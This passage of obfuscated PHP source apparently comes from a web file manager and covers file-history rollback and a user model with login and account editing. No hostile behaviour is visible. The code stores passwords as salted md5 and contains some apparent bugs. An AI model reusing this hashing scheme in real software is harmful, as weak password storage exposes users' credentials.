if (!$DìäöôÖğ… || !$DìäöôÖğ…[$Eİ‰–Ù¹[363]]) { return !1; } goto E±„ó®‘„; E±„ó®‘„: $bçâõ¤Îª = $Eİ‰–Ù¹[1095]; $bÙ­ÏËÇ–Ø = $bÙ­ÏËÇ–Ø ? $bÙ­ÏËÇ–Ø : get_path_this($d©Ášì’Ì); $bä½ÓæÛ‰ƒ = $bä½ÓæÛ‰ƒ ? $bä½ÓæÛ‰ƒ : $DìäöôÖğ…[$Eİ‰–Ù¹[1107]]; goto fØ Î’ö§†; fØ Î’ö§†: $FÂãÚ¦†¬² = substr(get_path_this($DìäöôÖğ…[$Eİ‰–Ù¹[1108]]), 0, -strlen($bçâõ¤Îª)); foreach ($DìäöôÖğ…[$Eİ‰–Ù¹[363]] as $C³ôˆÈùÇÌ => $C°Ù×“´) { $c§Ñ‡†íªŠ = $bÙ­ÏËÇ–Ø . substr($C°Ù×“´[$Eİ‰–Ù¹[28]], strlen($FÂãÚ¦†¬²)); $c™ÕøÓÒÛÈ = IO::move($DìäöôÖğ…[$Eİ‰–Ù¹[1107]] . $C°Ù×“´[$Eİ‰–Ù¹[28]], $bä½ÓæÛ‰ƒ, !1, $c§Ñ‡†íªŠ); if ($c™ÕøÓÒÛÈ) { $DìäöôÖğ…[$Eİ‰–Ù¹[363]][$C³ôˆÈùÇÌ][$Eİ‰–Ù¹[28]] = $c§Ñ‡†íªŠ; } } $DìäöôÖğ…[$Eİ‰–Ù¹[1108]] = IO::move($DìäöôÖğ…[$Eİ‰–Ù¹[1108]], $bä½ÓæÛ‰ƒ, !1, $bÙ­ÏËÇ–Ø . $bçâõ¤Îª); goto D†Å¹éÜÖ; EÄ‰ê ¹ñÏ: } public static function rollback($e›¼¡œê», $EƒÉäî‹¥ù) { $A·Âæ¤„Ÿƒ =& $_SERVER[òÀöí]; $F‘”¿Â¤ = self::listData($e›¼¡œê»); if (!$F‘”¿Â¤) { return; } $C†¿ËÒ¯‹ = IO::info($e›¼¡œê»); foreach ($F‘”¿Â¤[$A·Âæ¤„Ÿƒ[363]] as $f¢¬ƒ†¬ => $b¤äõùÌ©™) { if ($b¤äõùÌ©™[$A·Âæ¤„Ÿƒ[385]] == $EƒÉäî‹¥ù) { self::add($e›¼¡œê»); $c·ù¹¸Ôäæ = $F‘”¿Â¤[$A·Âæ¤„Ÿƒ[1107]] . $b¤äõùÌ©™[$A·Âæ¤„Ÿƒ[28]]; $aŒØÉã®„ä = IO::copy($c·ù¹¸Ôäæ, IO::pathFather($e›¼¡œê»), REPEAT_REPLACE, $C†¿ËÒ¯‹[$A·Âæ¤„Ÿƒ[28]]); if ($aŒØÉã®„ä) { self::remove($e›¼¡œê», $EƒÉäî‹¥ù); } return $aŒØÉã®„ä; } } return !1; } public static function setDetail($b¿›ìĞ²Ä, $Eİ‰—ŒŸòÚ, $cÚÉîÒİ¶) { $Bñô›š°ƒ† =& $_SERVER[òÀöí]; $cà¬“çÕ = self::listData($b¿›ìĞ²Ä); if (!$cà¬“çÕ) { return; } foreach ($cà¬“çÕ[$Bñô›š°ƒ†[363]] as $DŒØÇÃÊî‰ => $CêÉéÑ’Ø) { if ($CêÉéÑ’Ø[$Bñô›š°ƒ†[385]] == $Eİ‰—ŒŸòÚ) { $cà¬“çÕ[$Bñô›š°ƒ†[363]][$DŒØÇÃÊî‰][$Bñô›š°ƒ†[1106]] = $cÚÉîÒİ¶; self::saveData($cà¬“çÕ[$Bñô›š°ƒ†[1108]], $cà¬“çÕ[$Bñô›š°ƒ†[363]]); return !0; } } return !1; } public static function fileInfo($AøÒ«Ã‹Œ, $aƒÑˆàåÇ¶) { goto föÃ¸¹ìÉĞ; föÃ¸¹ìÉĞ: $cÄ¤è‡Îğ‹ =& $_SERVER[òÀöí]; $dÙš­Œí×¤ = self::listData($AøÒ«Ã‹Œ); if (!$dÙš­Œí×¤) { show_json(LNG($cÄ¤è‡Îğ‹[104]), !1); } goto CÕÃ¢š—­Í; dÕó³†Çê¶: return IO::info($dò–¤»æ†á); goto B”’©…¸–; CÕÃ¢š—­Í: $dò–¤»æ†á = $cÄ¤è‡Îğ‹[33]; foreach ($dÙš­Œí×¤[$cÄ¤è‡Îğ‹[363]] as $d‰¾†ÕƒØ => $aâÅé²•à) { if ($aâÅé²•à[$cÄ¤è‡Îğ‹[385]] != $aƒÑˆàåÇ¶) { continue; } $dò–¤»æ†á = $dÙš­Œí×¤[$cÄ¤è‡Îğ‹[1107]] . $aâÅé²•à[$cÄ¤è‡Îğ‹[28]]; break; } if (!$dò–¤»æ†á) { show_json(LNG($cÄ¤è‡Îğ‹[104]), !1); } goto dÕó³†Çê¶; B”’©…¸–: } public static function fileOut($bâÓœ¹ğÜˆ, $D’¿•Öñç¼, $CÑóô›¹– = false) { $bšåè¸›Ú =& $_SERVER[òÀöí]; $Eáå´åœ‚Ú = self::fileInfo($bâÓœ¹ğÜˆ, $D’¿•Öñç¼); $fªŠ²Õ•Î =& $GLOBALS[$bšåè¸›Ú[7]]; $CÑóô›¹– = isset($fªŠ²Õ•Î[$bšåè¸›Ú[1072]]) && $fªŠ²Õ•Î[$bšåè¸›Ú[1072]] == 1; if (isset($fªŠ²Õ•Î[$bšåè¸›Ú[29]]) && $fªŠ²Õ•Î[$bšåè¸›Ú[29]] == $bšåè¸›Ú[1109]) { return IO::fileOutImage($Eáå´åœ‚Ú[$bšåè¸›Ú[75]], $fªŠ²Õ•Î[$bšåè¸›Ú[1110]]); } IO::fileOut($Eáå´åœ‚Ú[$bšåè¸›Ú[75]], $CÑóô›¹–, get_path_this($bâÓœ¹ğÜˆ)); } public static function listData($D®¨µ£²É—, $a¦šê™Ğ† = true) { goto c£ˆëÌÒñ; c£ˆëÌÒñ: $E˜ŞìÎÚï =& $_SERVER[òÀöí]; if ($a¦šê™Ğ† && !IO::exist($D®¨µ£²É—)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto A¨¢´ùÁğ; bæÖ‹ê’……: $e¹­ÛƒØŒ = IO::getContent($CÄ»°Ë²ßÈ[$E˜ŞìÎÚï[1108]]); if ($e¹­ÛƒØŒ) { $aË”×Å‰ïù = json_decode($e¹­ÛƒØŒ, !0); if (is_array($aË”×Å‰ïù)) { $CÄ»°Ë²ßÈ[$E˜ŞìÎÚï[363]] = $aË”×Å‰ïù; } } return $CÄ»°Ë²ßÈ; goto b‰‹—Â©÷È; A¨¢´ùÁğ: if (substr($D®¨µ£²É—, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $C¬³®Î¦¨ = self::pathHistory($D®¨µ£²É—); $CÄ»°Ë²ßÈ = array($E˜ŞìÎÚï[1108] => $C¬³®Î¦¨ . $E˜ŞìÎÚï[1095], $E˜ŞìÎÚï[1107] => rtrim(get_path_father($C¬³®Î¦¨), $E˜ŞìÎÚï[8]) . $E˜ŞìÎÚï[8], $E˜ŞìÎÚï[363] => array()); goto bæÖ‹ê’……; b‰‹—Â©÷È: } private static function saveData($DËİ¢Å«“‰, $b²Æ§„ÇÕ) { goto f£Šœ¹İ‰œ; F×¯¦‹º: return !0; goto FË„Èôà›Ü; AÕ°„„©Ğ—: $aÛæêƒ×èÇ = IO::pathFather($DËİ¢Å«“‰); IO::remove($DËİ¢Å«“‰); self::clearEmptyFolder($aÛæêƒ×èÇ); goto F×¯¦‹º; f£Šœ¹İ‰œ: $eÍ…Ñ÷¾Â =& $_SERVER[òÀöí]; self::log($eÍ…Ñ÷¾Â[1111] . $DËİ¢Å«“‰ . $eÍ…Ñ÷¾Â[67] . count($b²Æ§„ÇÕ), $eÍ…Ñ÷¾Â[710]); if ($b²Æ§„ÇÕ) { return IO::setContent($DËİ¢Å«“‰, json_encode($b²Æ§„ÇÕ)); } goto AÕ°„„©Ğ—; FË„Èôà›Ü: } public static function clearEmptyFolder($A‚³ÔØ¦”) { goto a› ŒƒæĞ…; a› ŒƒæĞ…: $CÄƒÄùÓ°ˆ =& $_SERVER[òÀöí]; if (trim($A‚³ÔØ¦”, $CÄƒÄùÓ°ˆ[8]) == trim(self::$_historyBase, $CÄƒÄùÓ°ˆ[8])) { return; } $fš›Â»ŸØ = IO::pathFather($A‚³ÔØ¦”); goto e÷’¿ÊŸ; FõŞÃ‹­“Ä: self::clearEmptyFolder($fš›Â»ŸØ); goto a‹ÀÜØØïé; e÷’¿ÊŸ: $E¹Í”ªù = IO::has($A‚³ÔØ¦”, !0); if ($E¹Í”ªù[$CÄƒÄùÓ°ˆ[201]] > 0 || $E¹Í”ªù[$CÄƒÄùÓ°ˆ[202]] > 0) { return; } IO::remove($A‚³ÔØ¦”); goto FõŞÃ‹­“Ä; a‹ÀÜØØïé: } private static function getBasePath() { goto báÀîàŞ¹; D÷˜Ô¶œğµ: $Aº«±¾Á° = DATA_PATH . $a¿±¤Œ˜é‘[1114]; $Aº«±¾Á° = IO::mkdir($Aº«±¾Á°); $Aº«±¾Á° = rtrim($Aº«±¾Á°, $a¿±¤Œ˜é‘[8]) . $a¿±¤Œ˜é‘[8]; goto DÛËÂ¤‘Í½; DÛËÂ¤‘Í½: file_put_contents($Aº«±¾Á° . $a¿±¤Œ˜é‘[1115], $a¿±¤Œ˜é‘[33]); Model($a¿±¤Œ˜é‘[1112])->set($a¿±¤Œ˜é‘[1113], $Aº«±¾Á°); return $Aº«±¾Á°; goto E–Å¥ÁªËĞ; báÀîàŞ¹: $a¿±¤Œ˜é‘ =& $_SERVER[òÀöí]; $Aº«±¾Á° = Model($a¿±¤Œ˜é‘[1112])->get($a¿±¤Œ˜é‘[1113]); if (IO::exist($Aº«±¾Á°)) { return $Aº«±¾Á°; } goto D÷˜Ô¶œğµ; E–Å¥ÁªËĞ: } } goto C³íˆÌéÃì; bøÚœ¶œ˜: class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72"; protected $tableMeta = array("\164\141\x62\x6c\145\116\x61\155\x65" => "\x75\163\145\x72\137\x6d\x65\x74\x61", "\x6d\145\164\x61\x46\x69\145\x6c\144" => "\x75\163\145\x72\111\104"); protected $simpleField = "\x75\163\145\x72\111\104\54\156\x69\x63\x6b\116\141\155\145\54\156\x61\x6d\x65\x2c\141\x76\141\x74\141\162\54\163\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($CÓªëÚÀã„) { $Eï•¥¼±â¶ =& $_SERVER[òÀöí]; $E¬—†ùíÓÅ = $Eï•¥¼±â¶[2079]; return array($Eï•¥¼±â¶[1736] => array($CÓªëÚÀã„[0], $E¬—†ùíÓÅ), $Eï•¥¼±â¶[1738] => array($CÓªëÚÀã„[0], $E¬—†ùíÓÅ), $Eï•¥¼±â¶[2080] => array($CÓªëÚÀã„[0], $E¬—†ùíÓÅ)); } protected function getInfo($d©ï¡–È÷ø, $F’œğÔ¡‰ô = false) { $FÙŠÃíãÜ« = $this->getInfoSimple($d©ï¡–È÷ø); if (!is_array($FÙŠÃíãÜ«)) { return array(); } if ($F’œğÔ¡‰ô) { return $this->_getInfoApply($FÙŠÃíãÜ«); } return $this->cacheFunctionGet($_SERVER[òÀöí][1792], $d©ï¡–È÷ø); } protected function getInfoFull($AÉòñ˜§, $A‰ÓïÕ¥æï = false) { $e›Æ‹âß¬‚ = $this->getInfoSimple($AÉòñ˜§); if (!is_array($e›Æ‹âß¬‚)) { return array(); } if ($A‰ÓïÕ¥æï) { return $this->_getInfoApply($e›Æ‹âß¬‚, !0); return $this->_getInfoApply($e›Æ‹âß¬‚, !0); } return $this->cacheFunctionGet($_SERVER[òÀöí][2081], $AÉòñ˜§); } private function _getInfoApply($d…«ÚÑŸ, $A‘¾½“›Õß = false) { goto DÕ½Ô·Û; Fâè¦‡´ê‰: $d…«ÚÑŸ = $this->_listDataApplyItem($d…«ÚÑŸ); $B›àÎïÂôÉ = Model($A˜´Î·ãšŒ[1181])->metaGet($d…«ÚÑŸ[$A˜´Î·ãšŒ[84]][$A˜´Î·ãšŒ[387]]); $d…«ÚÑŸ[$A˜´Î·ãšŒ[2084]] = $d‘»ø­ÈÄ; goto aéõ„‡ˆ­; DÕ½Ô·Û: $A˜´Î·ãšŒ =& $_SERVER[òÀöí]; if (!$d…«ÚÑŸ) { return $d…«ÚÑŸ; } $d‘»ø­ÈÄ = md5($A˜´Î·ãšŒ[2082] . $d…«ÚÑŸ[$A˜´Î·ãšŒ[828]] . $A˜´Î·ãšŒ[2083] . $d…«ÚÑŸ[$A˜´Î·ãšŒ[28]]); goto Fâè¦‡´ê‰; aéõ„‡ˆ­: $d…«ÚÑŸ[$A˜´Î·ãšŒ[84]][$A˜´Î·ãšŒ[1923]] = isset($B›àÎïÂôÉ[$A˜´Î·ãšŒ[1924]]) ? $B›àÎïÂôÉ[$A˜´Î·ãšŒ[1924]] : null; if ($A‘¾½“›Õß) { $d…«ÚÑŸ[$A˜´Î·ãšŒ[434]] = $this->metaGet($d…«ÚÑŸ[$A˜´Î·ãšŒ[1504]]); } return $d…«ÚÑŸ; goto Aá¦ì©øµø; Aá¦ì©øµø: } protected function getInfoSimple($c´Ûîì·‚‹, $Aš™Œ‡­·÷ = false) { $CŠ¼„ˆæ„½ =& $_SERVER[òÀöí]; if (!$c´Ûîì·‚‹) { return array(); } if ($Aš™Œ‡­·÷) { $eåà‰æˆ« = $this->where(array($CŠ¼„ˆæ„½[1504] => intval($c´Ûîì·‚‹)))->find(); if (!is_array($eåà‰æˆ«)) { return array(); } $eåà‰æˆ«[$CŠ¼„ˆæ„½[2085]] = Action($CŠ¼„ˆæ„½[2086])->parseUrl($eåà‰æˆ«[$CŠ¼„ˆæ„½[2085]]); return $eåà‰æˆ«; } return $this->cacheFunctionGet($CŠ¼„ˆæ„½[1739], $c´Ûîì·‚‹); } protected function getInfoSimpleOuter($d„ÚÔïÄ¥) { goto C®×•‘Ú£; C®×•‘Ú£: $E¸ËÎø²¥Å =& $_SERVER[òÀöí]; if (!$d„ÚÔïÄ¥ || $d„ÚÔïÄ¥ == 0) { return array($E¸ËÎø²¥Å[1504] => $E¸ËÎø²¥Å[486], $E¸ËÎø²¥Å[28] => $E¸ËÎø²¥Å[159] . LNG($E¸ËÎø²¥Å[2087]) . $E¸ËÎø²¥Å[494], $E¸ËÎø²¥Å[2085] => STATIC_PATH . $E¸ËÎø²¥Å[2088]); } $eøøÆ»ŒÏ = $this->cacheFunctionGet($E¸ËÎø²¥Å[1739], $d„ÚÔïÄ¥); goto FóÔìœ…“ù; FóÔìœ…“ù: $d¥ì¢•Ü½ƒ = array_field_key($eøøÆ»ŒÏ, explode($E¸ËÎø²¥Å[47], $this->simpleField)); if (!$d¥ì¢•Ü½ƒ) { return array($E¸ËÎø²¥Å[1504] => $E¸ËÎø²¥Å[1063], $E¸ËÎø²¥Å[28] => $E¸ËÎø²¥Å[159] . LNG($E¸ËÎø²¥Å[2089]) . $E¸ËÎø²¥Å[494], $E¸ËÎø²¥Å[2085] => STATIC_PATH . $E¸ËÎø²¥Å[2090]); } $d¥ì¢•Ü½ƒ[$E¸ËÎø²¥Å[2085]] = Action($E¸ËÎø²¥Å[2086])->parseUrl($d¥ì¢•Ü½ƒ[$E¸ËÎø²¥Å[2085]]); goto Dã¬Ÿ„”³; Dã¬Ÿ„”³: return $d¥ì¢•Ü½ƒ; goto EŞêãˆŠ¯›; EŞêãˆŠ¯›: } protected function groupUser($Fç‹‘Ìœ®“) { } public static function errorLang($eßÅğßŸø¢) { $e¥¦ø™æñ =& $_SERVER[òÀöí]; $Fâ…¨Šôâ = array(self::ERROR_USER_NOT_EXISTS => $e¥¦ø™æñ[2091], self::ERROR_USER_PASSWORD_ERROR => $e¥¦ø™æñ[2092], self::ERROR_USER_EXIST_NAME => $e¥¦ø™æñ[2093], self::ERROR_USER_EXIST_PHONE => $e¥¦ø™æñ[2094], self::ERROR_USER_EXIST_EMAIL => $e¥¦ø™æñ[2095], self::ERROR_USER_LOGIN_LOCK => $e¥¦ø™æñ[2096], self::ERROR_IP_NOT_ALLOW => $e¥¦ø™æñ[2097], self::ERROR_USER_EXIST_NICKNAME => $e¥¦ø™æñ[2098]); return LNG($Fâ…¨Šôâ[$eßÅğßŸø¢]); } public function getInfoByMeta($DîŒÃ¹Ìà¿, $Fê¸È¢´İ˜) { $c®²¢ÆĞ Î =& $_SERVER[òÀöí]; $c¤Ó®Ãá¸² = Model($c®²¢ÆĞ Î[2099])->where(array($c®²¢ÆĞ Î[92] => $DîŒÃ¹Ìà¿, $c®²¢ÆĞ Î[368] => $Fê¸È¢´İ˜))->find(); if ($c¤Ó®Ãá¸²) { return $this->getInfo($c¤Ó®Ãá¸²[$c®²¢ÆĞ Î[1504]]); } return !1; } public function userLoginCheck($eá¼¥¤ÛÆ‚, $F¾•—Ÿ¹¢) { $A±‚ÈÁİÛä =& $_SERVER[òÀöí]; $c·ÚÈÔµ÷› = $this->userLoginFind($eá¼¥¤ÛÆ‚); if (!$c·ÚÈÔµ÷›) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($c·ÚÈÔµ÷›[$A±‚ÈÁİÛä[1504]], $F¾•—Ÿ¹¢)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($c·ÚÈÔµ÷›[$A±‚ÈÁİÛä[1504]]); } public function userLoginFind($EùÓÒ“ÄÔ×) { $d‘ˆ÷“àçÔ =& $_SERVER[òÀöí]; $fÆîËƒÁå  = array($d‘ˆ÷“àçÔ[28] => $EùÓÒ“ÄÔ×, $d‘ˆ÷“àçÔ[1927] => $EùÓÒ“ÄÔ×, $d‘ˆ÷“àçÔ[301] => $EùÓÒ“ÄÔ×, $d‘ˆ÷“àçÔ[2100] => $EùÓÒ“ÄÔ×, $d‘ˆ÷“àçÔ[936] => $d‘ˆ÷“àçÔ[938]); if ($this->nickNameRpt()) { unset($fÆîËƒÁå [$d‘ˆ÷“àçÔ[1927]]); } return $this->where($fÆîËƒÁå )->find(); } public function clearCache($AæÖÎ£ÕãÜ) { $DçÎº…ÚÛ± =& $_SERVER[òÀöí]; $this->cacheFunctionClear($DçÎº…ÚÛ±[1792], $AæÖÎ£ÕãÜ); $this->cacheFunctionClear($DçÎº…ÚÛ±[1739], $AæÖÎ£ÕãÜ); $this->cacheFunctionClear($DçÎº…ÚÛ±[2081], $AæÖÎ£ÕãÜ); } public function userPasswordCheck($DÔæ“›ŒĞ, $cÍ¹ãëóë) { $CŠø·±‘´õ =& $_SERVER[òÀöí]; $E„ö³İ„òŒ = $this->where(array($CŠø·±‘´õ[1504] => intval($DÔæ“›ŒĞ)))->find(); $fï¯ï ÒŸ = $this->metaGet($DÔæ“›ŒĞ); $aâÚîÓ‡¶« = isset($fï¯ï ÒŸ[$CŠø·±‘´õ[2101]]) ? $fï¯ï ÒŸ[$CŠø·±‘´õ[2101]] : $CŠø·±‘´õ[33]; if (md5($aâÚîÓ‡¶« . trim($cÍ¹ãëóë)) !== $E„ö³İ„òŒ[$CŠø·±‘´õ[828]]) { return !1; } return !0; } public function userAdd($bƒÊÎÃÇ¶®) { goto B‡‡Ö×ï‡ƒ; f¾•ÊöôÌ: $E¨ÀÜİ = $this->_checkExist($bƒÊÎÃÇ¶®); if ($E¨ÀÜİ !== !0) { return $E¨ÀÜİ; } $dÕ®¯ß£‡Š = $this->add($b‘Ö‹Ñä); goto eÀ†‚ ÄÈ­; d“²ÊãÇ: return $dÕ®¯ß£‡Š; goto d«‡ÑÕĞŒ; B‡‡Ö×ï‡ƒ: $C‹Ò¢³÷ =& $_SERVER[òÀöí]; $b‘Ö‹Ñä = array($C‹Ò¢³÷[404] => $bƒÊÎÃÇ¶®[$C‹Ò¢³÷[28]], $C‹Ò¢³÷[2102] => $bƒÊÎÃÇ¶®[$C‹Ò¢³÷[1388]], $C‹Ò¢³÷[2103] => isset($bƒÊÎÃÇ¶®[$C‹Ò¢³÷[301]]) ? $bƒÊÎÃÇ¶®[$C‹Ò¢³÷[301]] : $C‹Ò¢³÷[33], $C‹Ò¢³÷[2104] => isset($bƒÊÎÃÇ¶®[$C‹Ò¢³÷[2100]]) ? $bƒÊÎÃÇ¶®[$C‹Ò¢³÷[2100]] : $C‹Ò¢³÷[33], $C‹Ò¢³÷[2105] => isset($bƒÊÎÃÇ¶®[$C‹Ò¢³÷[1927]]) ? $bƒÊÎÃÇ¶®[$C‹Ò¢³÷[1927]] : $bƒÊÎÃÇ¶®[$C‹Ò¢³÷[28]], $C‹Ò¢³÷[2106] => isset($bƒÊÎÃÇ¶®[$C‹Ò¢³÷[2085]]) ? $bƒÊÎÃÇ¶®[$C‹Ò¢³÷[2085]] : $C‹Ò¢³÷[33], $C‹Ò¢³÷[2107] => isset($bƒÊÎÃÇ¶®[$C‹Ò¢³÷[2108]]) ? $bƒÊÎÃÇ¶®[$C‹Ò¢³÷[2108]] : 1, $C‹Ò¢³÷[2109] => $bƒÊÎÃÇ¶®[$C‹Ò¢³÷[828]], $C‹Ò¢³÷[1740] => isset($bƒÊÎÃÇ¶®[$C‹Ò¢³÷[1647]]) ? $bƒÊÎÃÇ¶®[$C‹Ò¢³÷[1647]] : 1024 * 1024 * 20, $C‹Ò¢³÷[1741] => 0, $C‹Ò¢³÷[2110] => 0, $C‹Ò¢³÷[1779] => isset($bƒÊÎÃÇ¶®[$C‹Ò¢³÷[708]]) ? $bƒÊÎÃÇ¶®[$C‹Ò¢³÷[708]] : 1); if (!empty($bƒÊÎÃÇ¶®[$C‹Ò¢³÷[1504]])) { $b‘Ö‹Ñä[$C‹Ò¢³÷[1504]] = $bƒÊÎÃÇ¶®[$C‹Ò¢³÷[1504]]; } goto f¾•ÊöôÌ; eÀ†‚ ÄÈ­: $dãì›™÷Š = array($C‹Ò¢³÷[2109] => $b‘Ö‹Ñä[$C‹Ò¢³÷[828]], $C‹Ò¢³÷[2105] => $b‘Ö‹Ñä[$C‹Ò¢³÷[1927]]); $this->userEdit($dÕ®¯ß£‡Š, $dãì›™÷Š); Model($C‹Ò¢³÷[1181])->userRootAdd($dÕ®¯ß£‡Š); goto d“²ÊãÇ; d«‡ÑÕĞŒ: } protected function userEditTest($Fø¿”ªì, $e‚Ô˜âŠ´) { return $this->call($_SERVER[òÀöí][2111], $Fø¿”ªì, $e‚Ô˜âŠ´); } protected function userEdit($FĞ×¿ˆÄ®É, $CÍ¼­áí×æ) { goto Fõ¼ôïê; Fõ¼ôïê: $aª“ÛÇîë =& $_SERVER[òÀöí]; $D‡¯‘íáº• = $this->getInfoSimple($FĞ×¿ˆÄ®É); if (!$D‡¯‘íáº•) { return !1; } goto f›®Ì„£; f›®Ì„£: $Bàäåğ¦ê¬ = $this->_checkExist($CÍ¼­áí×æ, $FĞ×¿ˆÄ®É); if ($Bàäåğ¦ê¬ !== !0) { return $Bàäåğ¦ê¬; } if (isset($CÍ¼­áí×æ[$aª“ÛÇîë[828]]) && trim($CÍ¼­áí×æ[$aª“ÛÇîë[828]]) != $aª“ÛÇîë[33]) { $E›½Š”µ Û = $this->metaGet($FĞ×¿ˆÄ®É); if (empty($E›½Š”µ Û[$aª“ÛÇîë[2101]])) { $E›½Š”µ Û[$aª“ÛÇîë[2101]] = rand_string(10); Model($aª“ÛÇîë[492])->metaSet($FĞ×¿ˆÄ®É, $aª“ÛÇîë[2101], $E›½Š”µ Û[$aª“ÛÇîë[2101]]); } $CÍ¼­áí×æ[$aª“ÛÇîë[828]] = md5($E›½Š”µ Û[$aª“ÛÇîë[2101]] . trim($CÍ¼­áí×æ[$aª“ÛÇîë[828]])); } else { unset($CÍ¼­áí×æ[$aª“ÛÇîë[828]]); } goto CÉ“‹Õóë¾; c­Ò¯Ü¾ì’: return !0; goto A„¤ˆÔéÂ; CÉ“‹Õóë¾: $this->where(array($aª“ÛÇîë[1496] => $FĞ×¿ˆÄ®É))->save($CÍ¼­áí×æ); if (isset($CÍ¼­áí×æ[$aª“ÛÇîë[1927]])) { $this->setNamePinyin($FĞ×¿ˆÄ®É, $CÍ¼­áí×æ[$aª“ÛÇîë[1927]]); } $this->clearCache($FĞ×¿ˆÄ®É); goto c­Ò¯Ü¾ì’; A„¤ˆÔéÂ: } public function setNamePinyin($DèÒ§©öÅ, $F¿Ìâ¿êº— = false) { $EÅËöÕÍÃï =& $_SERVER[òÀöí]; if (!$F¿Ìâ¿êº—) { $båšòœØ = $this->getInfoSimple($DèÒ§©öÅ); $F¿Ìâ¿êº— = $båšòœØ[$EÅËöÕÍÃï[1927]] ? $båšòœØ[$EÅËöÕÍÃï[1927]] : $båšòœØ[$EÅËöÕÍÃï[28]]; } $E öô‹…æœ = Model($EÅËöÕÍÃï[495]); if (!Input::check($F¿Ìâ¿êº—, $EÅËöÕÍÃï[545])) { return $E öô‹…æœ->metaSet($DèÒ§©öÅ, array($EÅËöÕÍÃï[433] => $EÅËöÕÍÃï[33], $EÅËöÕÍÃï[432] => $EÅËöÕÍÃï[33])); } return $E öô‹…æœ->metaSet($DèÒ§©öÅ, array($EÅËöÕÍÃï[433] => str_replace($EÅËöÕÍÃï[50], $EÅËöÕÍÃï[33], Pinyin::encode($F¿Ìâ¿êº—)), $EÅËöÕÍÃï[432] => Pinyin::encode($F¿Ìâ¿êº—, $EÅËöÕÍÃï[546]))); } private function nickNameRpt() { $a­Ù‘›Š‹ =& $_SERVER[òÀöí]; $E˜£Éá¥òè = Model($a­Ù‘›Š‹[1102])->get($a­Ù‘›Š‹[2112]); $D¾¨¹…±ôª = $GLOBALS[$a­Ù‘›Š‹[6]][$a­Ù‘›Š‹[373]][$a­Ù‘›Š‹[2112]]; $FÄç¤Ş‰ÚŞ = !is_null($E˜£Éá¥òè) ? $E˜£Éá¥òè : $D¾¨¹…±ôª; return !!$FÄç¤Ş‰ÚŞ; } private function _checkExist($BĞÁÖ¯ºíÏ, $FŸš©ïÅ‰ = false) { $Dõ™ÅÙ„±Ğ =& $_SERVER[òÀöí]; $AÉ…‘Öõä = array($Dõ™ÅÙ„±Ğ[28] => UserModel::ERROR_USER_EXIST_NAME, $Dõ™ÅÙ„±Ğ[1927] => UserModel::ERROR_USER_EXIST_NICKNAME, $Dõ™ÅÙ„±Ğ[301] => UserModel::ERROR_USER_EXIST_EMAIL, $Dõ™ÅÙ„±Ğ[2100] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($AÉ…‘Öõä[$Dõ™ÅÙ„±Ğ[1927]]); } $cõãôŒ½×£ = $FŸš©ïÅ‰ ? array($Dõ™ÅÙ„±Ğ[1504] => array($Dõ™ÅÙ„±Ğ[2113], $FŸš©ïÅ‰)) : array(); foreach ($AÉ…‘Öõä as $CùÚŒ…«ğ => $b—Î¤ìä) { $E¿½¿·‘÷Ó = array(); foreach ($AÉ…‘Öõä as $aˆµå¹¤ => $A»ƒ¤ì†±§) { if (isset($BĞÁÖ¯ºíÏ[$aˆµå¹¤]) && $BĞÁÖ¯ºíÏ[$aˆµå¹¤]) { $E¿½¿·‘÷Ó[] = $BĞÁÖ¯ºíÏ[$aˆµå¹¤]; } } if (!$E¿½¿·‘÷Ó) { continue; } $c©»Ÿ¤ÀŞ = array_merge(array($CùÚŒ…«ğ => array($Dõ™ÅÙ„±Ğ[7], $E¿½¿·‘÷Ó)), $cõãôŒ½×£); $BåŞ‘¼ãì© = $this->where($c©»Ÿ¤ÀŞ)->find(); if ($BåŞ‘¼ãì©) { return $b—Î¤ìä; } } return !0; } public function userListInfo($FÒÒ‚—ÙÀ²) { $F££ÔÑëõœ =& $_SERVER[òÀöí]; $fìóË·† = array(); $FÒÒ‚—ÙÀ² = is_array($FÒÒ‚—ÙÀ²) ? array_unique($FÒÒ‚—ÙÀ²) : array(); if (!$FÒÒ‚—ÙÀ²) { return $fìóË·†; } if (count($FÒÒ‚—ÙÀ²) < 20) { foreach ($FÒÒ‚—ÙÀ² as $F½Ü„“•–Ò) { $fìóË·†[$F½Ü„“•–Ò . $F££ÔÑëõœ[33]] = $this->getInfoSimpleOuter($F½Ü„“•–Ò); } } else { $F¬ÛÔÜİÓ« = array($F££ÔÑëõœ[1496] => array($F££ÔÑëõœ[402], $FÒÒ‚—ÙÀ²)); if (count($FÒÒ‚—ÙÀ²) == 1) { $F¬ÛÔÜİÓ« = array($F££ÔÑëõœ[1496] => $FÒÒ‚—ÙÀ²[0]); } $Cç½‹™ïá = Model($F££ÔÑëõœ[492])->field($this->simpleField)->where($F¬ÛÔÜİÓ«)->select(); $Cç½‹™ïá = array_to_keyvalue($Cç½‹™ïá, $F££ÔÑëõœ[1504]); foreach ($FÒÒ‚—ÙÀ² as $F½Ü„“•–Ò) { $EÏËÈÚä±ë = $Cç½‹™ïá[$Cç½‹™ïá[$F½Ü„“•–Ò]]; if (!$EÏËÈÚä±ë) { $fìóË·†[$F½Ü„“•–Ò . $F££ÔÑëõœ[33]] = $this->getInfoSimpleOuter($F½Ü„“•–Ò); continue; } $EÏËÈÚä±ë[$F££ÔÑëõœ[2085]] = Action($F££ÔÑëõœ[2086])->parseUrl($EÏËÈÚä±ë[$F££ÔÑëõœ[2085]]); $fìóË·†[$F½Ü„“•–Ò . $F££ÔÑëõœ[33]] = $EÏËÈÚä±ë; } } return $fìóË·†; } protected function userStatus($aµ¹õîö‹å, $E­‹†¥†ä) { $BĞİ›ì…ëÆ = $this->getInfoSimple($aµ¹õîö‹å); if (!$BĞİ›ì…ëÆ) { return !1; } $f‘–¿èÈ = array($_SERVER[òÀöí][708] => $E­‹†¥†ä); return 